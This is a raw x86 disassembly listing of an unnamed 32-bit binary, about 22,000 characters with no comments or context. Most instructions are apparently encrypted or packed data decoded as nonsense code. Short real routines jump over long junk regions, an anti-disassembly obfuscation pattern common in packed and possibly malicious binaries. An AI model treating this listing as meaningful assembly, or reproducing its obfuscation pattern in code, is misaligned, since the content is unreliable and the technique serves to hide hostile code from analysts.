  409edf:	dec    edi
  409ee0:	repz jne 0x409e8d
  409ee3:	add    bl,BYTE PTR [esi-0x4b51fd8]
  409ee9:	fbstp  TBYTE PTR [ecx-0x20]
  409eec:	les    esp,FWORD PTR [ebp+0x3bd5254d]
  409ef2:	inc    edx
  409ef3:	xchg   ecx,eax
  409ef4:	pop    eax
  409ef5:	aam    0x38
  409ef7:	and    eax,0xee9730de
  409efc:	pop    eax
  409efd:	jae    0x409ef3
  409eff:	out    dx,al
  409f00:	push   eax
  409f01:	(bad)  
  409f02:	mov    eax,0x1de9e72d
  409f07:	loope  0x409ec2
  409f09:	jne    0x409e91
  409f0b:	fdiv   QWORD PTR [ebp+0x16519097]
  409f11:	mov    ecx,0xa0fea654
  409f16:	fisub  WORD PTR [eax+eax*4+0x52db8eaa]
  409f1d:	sbb    dl,BYTE PTR [eax-0x5f]
  409f20:	pop    esi
  409f21:	cmp    eax,0x4f2c2e7e
  409f26:	in     al,dx
  409f27:	and    BYTE PTR [edi],al
  409f29:	push   ss
  409f2a:	inc    eax
  409f2b:	adc    ebp,DWORD PTR [ecx]
  409f2d:	jae    0x409f42
  409f2f:	sub    bh,0x4b
  409f32:	xchg   ecx,eax
  409f33:	popf   
  409f34:	push   ebp
  409f35:	loope  0x409f02
  409f37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f38:	mov    eax,0xeb68cc42
  409f3d:	inc    edi
  409f3e:	add    al,0x3a
  409f40:	adc    BYTE PTR [edi+eiz*1],bl
  409f43:	popa   
  409f44:	pop    ecx
  409f45:	fbld   TBYTE PTR [edx+0x43]
  409f48:	and    bl,BYTE PTR [ebx]
  409f4a:	xor    DWORD PTR [ebp-0x32abc51],esi
  409f50:	sahf   
  409f51:	adc    DWORD PTR [edx],esi
  409f53:	sub    ebp,DWORD PTR [edx+esi*1]
  409f56:	mov    edi,0xe600d30b
  409f5b:	inc    edx
  409f5c:	xor    dh,bh
  409f5e:	ror    dl,0x8e
  409f61:	call   0x1a86:0xcce70da5
  409f68:	pop    ds
  409f69:	xchg   DWORD PTR [ecx+0x6d4d3a06],esp
  409f6f:	dec    esp
  409f70:	test   eax,0x94c166b5
  409f75:	pop    ebp
  409f76:	cbw    
  409f78:	xor    edx,0x23
  409f7b:	pop    esi
  409f7c:	js     0x409fb2
  409f7e:	(bad)  [edi+eiz*8+0x43]
  409f82:	add    al,ah
  409f84:	mov    edi,DWORD PTR [eax+esi*4-0x51]
  409f88:	js     0x409fef
  409f8a:	mov    esi,0xac758ded
  409f8f:	(bad)  
  409f91:	mov    ds:0x2f27a445,eax
  409f96:	out    dx,al
  409f97:	add    DWORD PTR [ecx+ebp*4-0x5a],eax
  409f9b:	cld    
  409f9c:	call   DWORD PTR [edx]
  409f9e:	repz mov esp,0xe6375b76
  409fa4:	jo     0x409fe6
  409fa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fa7:	dec    ecx
  409fa8:	sub    cl,BYTE PTR [edi]
  409faa:	sbb    eax,0x619d3613
  409faf:	pop    esp
  409fb0:	jb     0x40a00c
  409fb2:	or     bl,BYTE PTR [edi]
  409fb4:	fdivr  QWORD PTR ds:0x864b79d5
  409fba:	push   0xffffffef
  409fbc:	inc    edx
  409fbd:	mov    eax,0xf53a5d9f
  409fc2:	cmp    eax,0x8fa70994
  409fc7:	stc    
  409fc8:	xchg   edi,eax
  409fc9:	jns    0x409f99
  409fcb:	or     ebx,ecx
  409fcd:	mov    ecx,0xcd51e0f0
  409fd2:	rcr    BYTE PTR [ebx-0x59d60ff],0x63
  409fd9:	mov    ss,WORD PTR [ebx]
  409fdb:	xor    DWORD PTR [edi-0x1c0fe5f0],eax
  409fe1:	push   eax
  409fe2:	mov    ebp,0x101961a3
  409fe7:	mov    ds:0x490f24da,al
  409fec:	push   edx
  409fed:	aas    
  409fee:	fisttp DWORD PTR [edx-0x38]
  409ff1:	sub    BYTE PTR ds:0x9ad34a56,bh
  409ff7:	das    
  409ff8:	retf   
  409ff9:	in     al,dx
  409ffa:	fisub  DWORD PTR [ecx-0xf]
  409ffd:	and    al,0x7b
  409fff:	dec    edi
  40a000:	xchg   edi,eax
  40a001:	xchg   edi,eax
  40a002:	lahf   
  40a003:	data16 or dl,BYTE PTR [ebp+0xe]
  40a007:	(bad)  
  40a008:	dec    esp
  40a009:	daa    
  40a00a:	mov    esi,0xce24179b
  40a00f:	push   ebp
  40a010:	mov    eax,0x9b283d28
  40a015:	push   esi
  40a016:	sti    
  40a017:	leave  
  40a018:	pop    ds
  40a019:	arpl   WORD PTR [esi],bp
  40a01b:	sbb    BYTE PTR [edx+0x45bc0bbc],dh
  40a021:	call   0xd72c89ba
  40a026:	std    
  40a027:	scas   al,BYTE PTR es:[edi]
  40a028:	xchg   DWORD PTR [edx+0x7e],edx
  40a02b:	sub    edi,DWORD PTR [ebx+0x2c15aec4]
  40a031:	mov    dl,0x21
  40a033:	cs and eax,0x2057fbcd
  40a039:	dec    ecx
  40a03a:	pop    ebx
  40a03b:	lahf   
  40a03c:	pop    ebp
  40a03d:	mov    ecx,0x4a5326e5
  40a042:	in     eax,0xff
  40a044:	adc    DWORD PTR [esi+ecx*4+0xa],0xec754714
  40a04c:	loope  0x40a095
  40a04e:	mov    eax,0x305c4438
  40a053:	or     BYTE PTR [edi+0x8],cl
  40a056:	sbb    BYTE PTR [esi+eax*1-0x7fe02aa4],ah
  40a05d:	xlat   BYTE PTR ds:[ebx]
  40a05e:	pop    ss
  40a05f:	out    0x6d,al
  40a061:	test   eax,0xcd343b74
  40a066:	adc    BYTE PTR [esi],bl
  40a068:	cmp    ah,0xcc
  40a06b:	jp     0x40a04b
  40a06d:	xor    eax,0x1d
  40a070:	push   edx
  40a071:	push   0xf766f55d
  40a076:	out    0x43,eax
  40a078:	inc    edx
  40a079:	and    esi,ecx
  40a07b:	push   0x398f5a8c
  40a080:	push   ebp
  40a081:	cli    
  40a082:	mov    bh,0xa6
  40a084:	add    DWORD PTR [eax-0x77],edx
  40a087:	out    0xe7,eax
  40a089:	jmp    0x40a013
  40a08b:	cmc    
  40a08c:	stos   DWORD PTR es:[edi],eax
  40a08d:	enter  0xc925,0xed
  40a091:	imul   edx,DWORD PTR [eax+ebx*8],0xffffffe6
  40a095:	fucomip st,st(7)
  40a097:	jne    0x40a0ba
  40a099:	sahf   
  40a09a:	jb     0x40a089
  40a09c:	mov    al,ds:0x3b59f0da
  40a0a1:	adc    al,cl
  40a0a3:	mov    ds:0xc949af83,eax
  40a0a8:	das    
  40a0a9:	mov    ebp,DWORD PTR [ebp+0x7a]
  40a0ac:	outs   dx,DWORD PTR ds:[esi]
  40a0ad:	xchg   edi,eax
  40a0ae:	cli    
  40a0af:	test   DWORD PTR [edx-0x7b],edx
  40a0b2:	sub    al,dh
  40a0b4:	lock div BYTE PTR [esi+0x1674cf2a]
  40a0bb:	into   
  40a0bc:	sbb    ebp,edi
  40a0be:	jge    0x40a0b6
  40a0c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0c1:	(bad)  
  40a0c2:	test   BYTE PTR [ecx],0x29
  40a0c5:	sbb    ah,BYTE PTR [edi+ecx*1+0x4b]
  40a0c9:	or     eax,0x862edac2
  40a0ce:	stc    
  40a0cf:	lock mov ds:0x5627e88a,eax
  40a0d5:	push   es
  40a0d6:	xor    edi,DWORD PTR [ebx]
  40a0d8:	sbb    eax,ebp
  40a0da:	xchg   esi,eax
  40a0db:	fdivrp st(2),st
  40a0dd:	adc    eax,0x5b1bc42e
  40a0e2:	rcr    DWORD PTR [ebx-0x8],cl
  40a0e5:	xor    esi,eax
  40a0e7:	xor    BYTE PTR [ecx+0x68af5d44],bh
  40a0ed:	jb     0x40a0a2
  40a0ef:	and    DWORD PTR [esi+0xfec558b],0x3302d0ac
  40a0f9:	ror    DWORD PTR [ebx-0x153e17b3],0x2
  40a100:	mov    edx,DWORD PTR [ebp-0x14]
  40a103:	xor    edx,edx
  40a105:	shl    ecx,0x1e
  40a108:	or     eax,edx
  40a10a:	mov    ds:0x422810,eax
  40a10f:	pop    esi
  40a110:	leave  
  40a111:	ret    
  40a112:	push   ebp
  40a113:	mov    ebp,esp
  40a115:	sub    esp,0x28
  40a118:	push   ebx
  40a119:	push   esi
  40a11a:	push   edi
  40a11b:	mov    DWORD PTR [ebp-0x10],0x67e2
  40a122:	jmp    0x40a3b9
  40a127:	mov    al,ds:0xfc9cf9a5
  40a12c:	pushf  
  40a12d:	mov    al,ds:0xd54f94b9
  40a132:	jecxz  0x40a0d4
  40a134:	lock or dl,BYTE PTR [edx-0x41416ada]
  40a13b:	test   eax,0x8fbebec2
  40a140:	scas   al,BYTE PTR es:[edi]
  40a141:	neg    ah
  40a143:	stos   DWORD PTR es:[edi],eax
  40a144:	das    
  40a145:	or     al,0x19
  40a147:	jle    0x40a13b
  40a149:	cmp    eax,edi
  40a14b:	enter  0xd269,0x34
  40a14f:	ror    DWORD PTR [ebp+0x54],1
  40a152:	push   ds
  40a153:	mov    bl,0xbd
  40a155:	js     0x40a116
  40a157:	jo     0x40a119
  40a159:	jl     0x40a195
  40a15b:	bound  esi,QWORD PTR [edi+0x594cc297]
  40a161:	in     eax,0xbe
  40a163:	and    al,0x89
  40a165:	push   0x5e
  40a167:	vorps  xmm6,xmm2,XMMWORD PTR [ecx+edx*4]
  40a16c:	in     eax,dx
  40a16d:	mov    DWORD PTR [esi],esp
  40a16f:	sub    edx,ebp
  40a171:	add    ebx,DWORD PTR [eax]
  40a173:	neg    DWORD PTR [esi+0x6a5a2859]
  40a179:	inc    edx
  40a17a:	bound  esi,QWORD PTR [eax+0x7516446d]
  40a180:	ror    BYTE PTR [edi-0x3dcef77a],cl
  40a186:	xchg   esi,eax
  40a187:	push   ebx
  40a188:	sub    al,0x84
  40a18a:	shl    BYTE PTR ds:0xa51dae43,cl
  40a190:	mov    esp,0xa1eaf00c
  40a195:	loope  0x40a1a1
  40a197:	add    al,0x24
  40a199:	lock adc eax,0xb862f0c3
  40a19f:	mul    DWORD PTR ds:0xa80eee08
  40a1a5:	repnz push esi
  40a1a7:	mov    eax,ds:0x39af8516
  40a1ac:	push   eax
  40a1ad:	fild   QWORD PTR [edi]
  40a1af:	sub    al,0x2
  40a1b1:	sub    DWORD PTR [ecx+0x77],0xcdb35ac6
  40a1b8:	jmp    0xe75b:0x53017edf
  40a1bf:	push   0xffffff82
  40a1c1:	mov    ecx,0xe16d551c
  40a1c6:	sub    al,0xc5
  40a1c8:	and    BYTE PTR [edi],dh
  40a1ca:	or     BYTE PTR [esi+0x47],cl
  40a1cd:	popf   
  40a1ce:	out    dx,al
  40a1cf:	lods   eax,DWORD PTR ds:[esi]
  40a1d0:	add    edi,DWORD PTR [edi-0x7aa46a25]
  40a1d6:	mov    WORD PTR [edx-0x2102c515],cs
  40a1dc:	in     al,dx
  40a1dd:	not    DWORD PTR [edi-0x6b]
  40a1e0:	pop    esp
  40a1e1:	fwait
  40a1e2:	cmp    ecx,DWORD PTR [ebp-0x24]
  40a1e5:	sub    dl,BYTE PTR [edx+0x2f1a2722]
  40a1eb:	and    BYTE PTR ds:0x288ffe8c,bh
  40a1f1:	(bad)  
  40a1f2:	setbe  BYTE PTR [ebx+0x22]
  40a1f6:	sar    BYTE PTR [ecx+0x30],0xc1
  40a1fa:	push   ds
  40a1fb:	sbb    eax,eax
  40a1fd:	(bad)  
  40a1fe:	adc    al,0x2a
  40a200:	int3   
  40a201:	leave  
  40a202:	dec    edi
  40a203:	pop    eax
  40a204:	mov    WORD PTR [edi-0x46],?
  40a207:	loop   0x40a1e5
  40a209:	inc    ebx
  40a20a:	ja     0x40a25b
  40a20c:	nop
  40a20d:	arpl   WORD PTR [ecx-0x41],sp
  40a210:	and    al,0x57
  40a212:	mov    dl,0xa2
  40a214:	shl    BYTE PTR es:[ecx+esi*1-0x6c],0x38
  40a21a:	or     al,0xb7
  40a21c:	xor    BYTE PTR [ebp-0x1c0d78a4],bl
  40a222:	hlt    
  40a223:	or     esi,DWORD PTR [ebx-0x5c70d707]
  40a229:	add    eax,DWORD PTR [ebx]
  40a22b:	ins    DWORD PTR es:[edi],dx
  40a22c:	fwait
  40a22d:	mov    BYTE PTR [ecx],ah
  40a22f:	mov    edx,0xe77dd72a
  40a234:	mov    ecx,0xaa64bb71
  40a239:	shl    BYTE PTR [eax],0x22
  40a23c:	mov    al,0xbd
  40a23e:	and    bh,BYTE PTR [edx+0x6fe22bba]
  40a244:	mov    bl,0xc2
  40a246:	jmp    0x40a2b7
  40a248:	inc    eax
  40a249:	jne    0x40a1ed
  40a24b:	(bad)  
  40a24c:	(bad)  
  40a24d:	imul   BYTE PTR [ebp+0x2940c1c]
  40a253:	push   eax
  40a254:	sub    esp,ebx
  40a256:	(bad)  
  40a257:	fild   QWORD PTR [eax]
  40a259:	xchg   ecx,eax
  40a25a:	mov    ch,bl
  40a25c:	(bad)  
  40a25d:	mov    bl,0x60
  40a25f:	mov    BYTE PTR [ebx-0x22e14924],bh
  40a265:	inc    ecx
  40a266:	push   ebx
  40a267:	xlat   BYTE PTR ds:[ebx]
  40a268:	xor    dh,BYTE PTR [eax]
  40a26a:	sub    al,0xf9
  40a26c:	push   cs
  40a26d:	mov    DWORD PTR [ecx+0x4e],esp
  40a270:	cwde   
  40a271:	fcomp  QWORD PTR [edx]
  40a273:	(bad)  
  40a274:	and    esi,ebp
  40a276:	mov    ah,0x22
  40a278:	and    dh,al
  40a27a:	xor    BYTE PTR [ebp+0x6c77a048],0xd3
  40a281:	mov    bl,0x33
  40a283:	xlat   BYTE PTR ds:[ebx]
  40a284:	xor    eax,0x79e2d825
  40a289:	test   esi,esp
  40a28b:	retf   
  40a28c:	sub    BYTE PTR [edi+0x10229d43],dl
  40a292:	sbb    BYTE PTR [edi-0x1b400936],al
  40a298:	sbb    al,0xb
  40a29a:	sub    al,0x16
  40a29c:	and    eax,0xb532b9fd
  40a2a1:	and    eax,0x36ed334a
  40a2a6:	jle    0x40a299
  40a2a8:	std    
  40a2a9:	inc    ebx
  40a2aa:	sbb    ebx,eax
  40a2ac:	cwde   
  40a2ad:	fucom  st(5)
  40a2af:	pop    ecx
  40a2b0:	dec    ebx
  40a2b1:	ds xchg edx,eax
  40a2b3:	cmp    ch,BYTE PTR ds:0x87e269f8
  40a2b9:	cmc    
  40a2ba:	and    dl,cl
  40a2bc:	inc    ecx
  40a2bd:	int    0xab
  40a2bf:	push   0x72b5f46f
  40a2c4:	cmp    ch,BYTE PTR [edx+ebp*8-0x3757d286]
  40a2cb:	ds mov eax,0x4d5cbdd7
  40a2d1:	or     ch,BYTE PTR [ebx]
  40a2d3:	sbb    ah,BYTE PTR [esi-0x4722d578]
  40a2d9:	sbb    al,BYTE PTR [ebx]
  40a2db:	test   eax,0xf736689f
  40a2e0:	ror    ebp,1
  40a2e2:	mov    ebx,0x5a91f7fe
  40a2e7:	dec    ebp
  40a2e8:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40a2ea:	push   eax
  40a2eb:	xor    bh,bh
  40a2ed:	iret   
  40a2ee:	sub    edx,DWORD PTR [ebp+0x70595cc1]
  40a2f4:	or     DWORD PTR [esi-0x1a],esp
  40a2f7:	and    dl,ah
  40a2f9:	test   BYTE PTR ds:0x844ca804,dh
  40a2ff:	leave  
  40a300:	ins    DWORD PTR es:[edi],dx
  40a301:	xchg   ebx,eax
  40a302:	fdivr  DWORD PTR [ebx+0xb]
  40a305:	push   edi
  40a306:	push   cs
  40a307:	mov    edx,0x3c95be1a
  40a30c:	je     0x40a2fb
  40a30e:	sub    ch,dh
  40a310:	fldenv [edi-0x311018de]
  40a316:	inc    ecx
  40a317:	jo     0x40a2f6
  40a319:	cld    
  40a31a:	jmp    0x40a320
  40a31c:	aad    0xeb
  40a31e:	and    ebx,DWORD PTR [ecx+0x4c7ca169]
  40a324:	xchg   edx,eax
  40a325:	pushf  
  40a326:	push   ecx
  40a327:	std    
  40a328:	inc    eax
  40a329:	mov    ds:0x65bce0cc,al
  40a32e:	in     eax,dx
  40a32f:	jb     0x40a2ba
  40a331:	js     0x40a318
  40a333:	add    esp,eax
  40a335:	and    cl,0x61
  40a338:	mov    edi,0x5a213749
  40a33d:	pminsw mm3,mm4
  40a340:	mov    dh,0x71
  40a342:	loop   0x40a324
  40a344:	cld    
  40a345:	jnp    0x40a2e4
  40a347:	cli    
  40a348:	jnp    0x40a357
  40a34a:	mov    ds,WORD PTR ds:0x83b3dbd6
  40a350:	or     DWORD PTR [eax+0x6f],0x1ab3fe56
  40a357:	out    0x0,al
  40a359:	jp     0x40a319
  40a35b:	lds    edi,FWORD PTR ds:0xc45d42cf
  40a361:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a362:	dec    edx
  40a363:	outs   dx,BYTE PTR ds:[esi]
  40a364:	and    esi,DWORD PTR [eax+0x31]
  40a367:	pop    eax
  40a368:	or     eax,0xbe4cf3e3
  40a36d:	(bad)  
  40a36e:	cld    
  40a36f:	in     al,0x6a
  40a371:	fs retf 
  40a373:	(bad)  
  40a374:	cmp    cl,cl
  40a376:	dec    BYTE PTR [edx-0x73501b65]
  40a37c:	mov    dl,0xa9
  40a37e:	mov    edx,0x871728bf
  40a383:	add    edx,edi
  40a385:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a386:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a387:	ret    0x8f5c
  40a38a:	mov    eax,ds:0xfdf46a69
  40a38f:	jecxz  0x40a333
  40a391:	ret    
  40a392:	xchg   esp,eax
  40a393:	mov    dh,0x68
  40a395:	mov    bl,0x45
  40a397:	nop
  40a398:	xchg   DWORD PTR [ebx-0x5a4803f5],esp
  40a39e:	std    
  40a39f:	push   eax
  40a3a0:	sbb    ecx,esi
  40a3a2:	jno    0x40a414
  40a3a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3a5:	pop    ds
  40a3a6:	out    0x76,eax
  40a3a8:	xchg   DWORD PTR [eax],ebx
  40a3aa:	mov    WORD PTR [edx-0x6b],es
  40a3ad:	test   edi,esp
  40a3af:	fimul  WORD PTR [eax+0x22]
  40a3b2:	cdq    
  40a3b3:	pushf  
  40a3b4:	and    al,0xe6
  40a3b6:	inc    esp
  40a3b7:	fst    QWORD PTR [eax+0x26fc45c7]
  40a3bd:	inc    edi
  40a3be:	add    BYTE PTR [eax],al
  40a3c0:	mov    DWORD PTR [ebp-0x8],0x580
  40a3c7:	mov    DWORD PTR [ebp-0xc],0x5f3e
  40a3ce:	mov    DWORD PTR [ebp-0x28],0x3294
  40a3d5:	mov    DWORD PTR [ebp-0x24],0x643
  40a3dc:	mov    DWORD PTR [ebp-0x20],0x2545
  40a3e3:	mov    DWORD PTR [ebp-0x1c],0x43ab
  40a3ea:	xor    ebx,ebx
  40a3ec:	inc    ebx
  40a3ed:	jmp    0x40a684
  40a3f2:	ins    DWORD PTR es:[edi],dx
  40a3f3:	shr    ebx,0x9a
  40a3f6:	jl     0x40a3b4
  40a3f8:	scas   eax,DWORD PTR es:[edi]
  40a3f9:	sub    bl,BYTE PTR [ebx+ebp*1-0x7a]
  40a3fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3fe:	jnp    0x40a3c9
  40a400:	push   esp
  40a401:	sahf   
  40a402:	adc    DWORD PTR [ebx-0x3d564142],ebx
  40a408:	mov    esi,0xdc960be
  40a40d:	mov    esi,ebx
  40a40f:	(bad)  
  40a410:	mov    cl,0x6c
  40a412:	jno    0x40a39a
  40a414:	shl    BYTE PTR [edi],cl
  40a416:	add    al,0x56
  40a418:	push   edi
  40a419:	fisubr DWORD PTR [eax+0x5d41bd87]
  40a41f:	sbb    eax,ebp
  40a421:	lock shl DWORD PTR [eax-0x6],1
  40a425:	pop    ebp
  40a426:	sub    ebp,DWORD PTR [ecx+0x7b687dce]
  40a42c:	cmp    bl,BYTE PTR [eax-0x49]
  40a42f:	dec    esp
  40a430:	js     0x40a3b4
  40a432:	adc    ah,dl
  40a434:	cli    
  40a435:	xchg   ebp,eax
  40a436:	push   ecx
  40a437:	add    bl,dl
  40a439:	add    eax,ecx
  40a43b:	and    ecx,edx
  40a43d:	push   0xba00528
  40a442:	or     BYTE PTR [eax+0x1ad31f18],0x31
  40a449:	jne    0x40a4c8
  40a44b:	adc    ecx,DWORD PTR [ecx-0x7d]
  40a44e:	dec    eax
  40a44f:	xor    DWORD PTR [edi-0x6a],eax
  40a452:	(bad)  
  40a453:	mov    ds:0x4c521320,al
  40a458:	adc    BYTE PTR [eax+0x16],0xc3
  40a45c:	jbe    0x40a470
  40a45e:	(bad)  
  40a45f:	jp     0x40a4d7
  40a461:	js     0x40a4c1
  40a463:	jnp    0x40a498
  40a465:	jg     0x40a4a7
  40a467:	add    eax,DWORD PTR [edi+0xc043d66]
  40a46d:	xlat   BYTE PTR ds:[ebx]
  40a46e:	test   DWORD PTR [eax],eax
  40a470:	(bad)  
  40a473:	dec    esp
  40a474:	add    eax,0x6cf2f663
  40a479:	sub    BYTE PTR [edx-0x68a37c1d],cl
  40a47f:	test   bl,ch
  40a481:	dec    eax
  40a482:	cs stc 
  40a484:	and    DWORD PTR [edi],0x79
  40a487:	add    bl,dh
  40a489:	mov    eax,0xab155fb6
  40a48e:	add    DWORD PTR [ebx+eiz*2+0x6924c23a],esp
  40a495:	pop    eax
  40a496:	mov    ss,WORD PTR [eax-0x51]
  40a499:	ror    ecx,0xf5
  40a49c:	or     al,dl
  40a49e:	call   0xc6e3:0xce948f66
  40a4a5:	jo     0x40a45a
  40a4a7:	mov    ch,0x77
  40a4a9:	jns    0x40a4b1
  40a4ab:	test   eax,0xff03868d
  40a4b0:	ret    
  40a4b1:	dec    ebx
  40a4b2:	jns    0x40a488
  40a4b4:	mov    ah,0xbd
  40a4b6:	enter  0xd7a5,0x96
  40a4ba:	push   es
  40a4bb:	pop    ebp
  40a4bc:	mov    eax,DWORD PTR [edx]
  40a4be:	rol    BYTE PTR [eax],1
  40a4c0:	inc    ebp
  40a4c1:	int3   
  40a4c2:	call   0x636c:0xff5fa0d6
  40a4c9:	aam    0x82
  40a4cb:	ret    0x77fb
  40a4ce:	mov    ch,0x73
  40a4d0:	scas   eax,DWORD PTR es:[edi]
  40a4d1:	stos   BYTE PTR es:[edi],al
  40a4d2:	inc    eax
  40a4d3:	xor    BYTE PTR [edx+edx*8],dl
  40a4d6:	aaa    
  40a4d7:	sbb    DWORD PTR [ebx+0x319b92d1],esi
  40a4dd:	les    edi,FWORD PTR [edi+0x9]
  40a4e0:	sbb    ah,dl
  40a4e2:	stos   BYTE PTR es:[edi],al
  40a4e3:	dec    esi
  40a4e4:	jmp    0x40a471
  40a4e6:	xor    BYTE PTR [edi-0x45],0x2c
  40a4ea:	ins    BYTE PTR es:[edi],dx
  40a4eb:	sbb    ah,BYTE PTR [esi+0x6fe84e9b]
  40a4f1:	aaa    
  40a4f2:	mov    ecx,eax
  40a4f4:	push   ebp
  40a4f5:	bound  edx,QWORD PTR [ebx]
  40a4f7:	mov    ah,BYTE PTR [esi-0x7c]
  40a4fa:	enter  0x744,0x19
  40a4fe:	and    ebx,esp
  40a500:	mov    ah,0xea
  40a502:	dec    esi
  40a503:	push   edx
  40a504:	cwde   
  40a505:	arpl   WORD PTR [esi+0x2],bp
  40a508:	sahf   
  40a509:	dec    ecx
  40a50a:	cli    
  40a50b:	jg     0x40a586
  40a50d:	in     al,dx
  40a50e:	out    0x66,al
  40a510:	mov    dh,0x24
  40a512:	push   esi
  40a513:	loop   0x40a544
  40a515:	inc    esi
  40a516:	mov    ebp,0xab245384
  40a51b:	popa   
  40a51c:	ret    0x50bc
  40a51f:	out    dx,al
  40a520:	sahf   
  40a521:	push   cs
  40a522:	add    edi,DWORD PTR [esi-0x3a]
  40a525:	fucom  st(6)
  40a527:	sahf   
  40a528:	lods   al,BYTE PTR ds:[esi]
  40a529:	xchg   ebx,eax
  40a52a:	adc    esi,esp
  40a52c:	mov    ebx,DWORD PTR [edx+0x1f]
  40a52f:	inc    ebx
  40a530:	mov    ebp,ds
  40a532:	(bad)  
  40a533:	sub    eax,0xf5325421
  40a538:	xchg   edx,eax
  40a539:	push   es
  40a53a:	cwde   
  40a53b:	xchg   edx,eax
  40a53c:	ffree  st(0)
  40a53e:	sahf   
  40a53f:	mov    cs,esp
  40a541:	inc    ebx
  40a542:	add    eax,DWORD PTR [ebx]
  40a544:	xchg   esp,eax
  40a545:	popa   
  40a546:	jb     0x40a534
  40a548:	icebp  
  40a549:	aam    0x12
  40a54b:	dec    esp
  40a54c:	fbstp  TBYTE PTR [ecx+ebp*4-0x2f2c2572]
  40a553:	sbb    eax,0xecea91a2
  40a558:	cld    
  40a559:	loope  0x40a542
  40a55b:	out    0x5f,eax
  40a55d:	inc    eax
  40a55e:	mov    bh,0x67
  40a560:	iret   
  40a561:	add    BYTE PTR [ebp+0x34],bh
  40a564:	sar    DWORD PTR ss:[ecx-0x7e2b665a],1
  40a56b:	shl    ecx,0xf3
  40a56e:	push   ss
  40a56f:	xchg   ecx,eax
  40a570:	jg     0x40a5e6
  40a572:	idiv   BYTE PTR [eax]
  40a574:	cmp    edi,edx
  40a576:	aam    0x29
  40a578:	fidivr WORD PTR [esi+ecx*2]
  40a57b:	std    
  40a57c:	inc    ecx
  40a57d:	pushf  
  40a57e:	int3   
  40a57f:	or     al,0x1b
  40a581:	jae    0x40a5af
  40a583:	inc    edx
  40a584:	adc    ah,BYTE PTR [ebp-0xee28d64]
  40a58a:	or     DWORD PTR [ebp+eax*8-0x75ab1143],ecx
  40a591:	add    eax,0xa314b90b
  40a596:	mov    dl,dl
  40a598:	outs   dx,BYTE PTR ds:[esi]
  40a599:	popf   
  40a59a:	jecxz  0x40a580
  40a59c:	mov    eax,0xc378eac
  40a5a1:	in     eax,0x41
  40a5a3:	(bad)  
  40a5a4:	cmp    al,0x37
  40a5a6:	adc    eax,0xecf79b0f
  40a5ab:	and    dl,cl
  40a5ad:	xor    al,0x65
  40a5af:	test   DWORD PTR [ebx-0x7],esi
  40a5b2:	adc    ebx,DWORD PTR [esi+0x178f5be6]
  40a5b8:	aas    
  40a5b9:	or     al,BYTE PTR [bx+di-0x7b]
  40a5bd:	lahf   
  40a5be:	mov    eax,0x1affb174
  40a5c3:	xor    DWORD PTR [ebx],esp
  40a5c5:	cmp    eax,0xb33bd856
  40a5ca:	push   esp
  40a5cc:	cwde   
  40a5cd:	in     al,0x35
  40a5cf:	ds aaa 
  40a5d1:	jo     0x40a562
  40a5d3:	dec    ecx
  40a5d4:	sti    
  40a5d5:	jmp    0xdf85b34a
  40a5da:	aas    
  40a5db:	neg    ch
  40a5dd:	mov    bh,0xf5
  40a5df:	jmp    0x40a5b8
  40a5e1:	adc    DWORD PTR [ebx+0x2a4e15bc],eax
  40a5e7:	jecxz  0x40a593
  40a5e9:	repz jg 0x40a5c8
  40a5ec:	popf   
  40a5ed:	jae    0x40a644
  40a5ef:	jg     0x40a629
  40a5f1:	mov    BYTE PTR [ecx+0x6b395732],cl
  40a5f7:	xchg   ebp,eax
  40a5f8:	adc    bh,bl
  40a5fa:	or     DWORD PTR [ebp+0x68],ebx
  40a5fd:	gs mov dh,0xe4
  40a600:	mov    WORD PTR [esi+0x3acdd039],fs
  40a606:	and    dh,al
  40a608:	mov    al,0x1e
  40a60a:	sbb    DWORD PTR [edi+0x4bf00c0f],esi
  40a610:	jae    0x40a5f1
  40a612:	iret   
  40a613:	mov    eax,0x13c8c543
  40a618:	push   ss
  40a619:	daa    
  40a61a:	int    0x7f
  40a61c:	int3   
  40a61d:	ror    ah,0x5f
  40a620:	dec    esp
  40a621:	mov    ch,0xb
  40a623:	adc    DWORD PTR [ebx-0x60955672],ecx
  40a629:	mov    ebp,0x484af71f
  40a62e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a62f:	ss loopne 0x40a5e8
  40a632:	pop    edi
  40a633:	adc    eax,0x416d0195
  40a638:	mov    ah,0xbe
  40a63a:	stc    
  40a63b:	stc    
  40a63c:	imul   esi,eax,0xffffff83
  40a63f:	loop   0x40a5c6
  40a641:	xchg   edi,eax
  40a642:	aad    0x29
  40a644:	xchg   ecx,eax
  40a645:	lea    eax,[eax]
  40a647:	xchg   ecx,eax
  40a648:	xor    BYTE PTR [edx+0x28d0eb3],ah
  40a64e:	sbb    ebx,ebp
  40a650:	or     BYTE PTR [esi-0x70],bh
  40a653:	and    al,0x43
  40a655:	lods   al,BYTE PTR ds:[esi]
  40a656:	push   esi
  40a657:	in     eax,dx
  40a658:	iret   
  40a659:	push   ss
  40a65a:	cmp    BYTE PTR [edx],bh
  40a65c:	loopne 0x40a696
  40a65e:	ja     0x40a5e2
  40a660:	cmp    DWORD PTR [edx+0x1b],ecx
  40a663:	leave  
  40a664:	je     0x40a6e4
  40a666:	mov    esi,0xa92e23e9
  40a66b:	test   al,0x18
  40a66d:	out    dx,eax
  40a66e:	or     BYTE PTR [esi-0x37],0xf5
  40a672:	jle    0x40a6cd
  40a674:	je     0x40a6ad
  40a676:	jp     0x40a61e
  40a678:	push   ds
  40a679:	push   edi
  40a67a:	clc    
  40a67b:	adc    esi,edi
  40a67d:	lea    esi,[esi-0x1e]
  40a680:	ja     0x40a637
  40a682:	fwait
  40a683:	inc    ebx
  40a684:	mov    DWORD PTR [ebp-0x18],ebx
  40a687:	mov    DWORD PTR [ebp-0x14],0x76b1
  40a68e:	mov    ecx,DWORD PTR [ebp-0x8]
  40a691:	mov    eax,DWORD PTR [ebp-0x4]
  40a694:	sub    ecx,eax
  40a696:	add    ecx,DWORD PTR [ebp-0xc]
  40a699:	add    ecx,DWORD PTR [ebp-0x10]
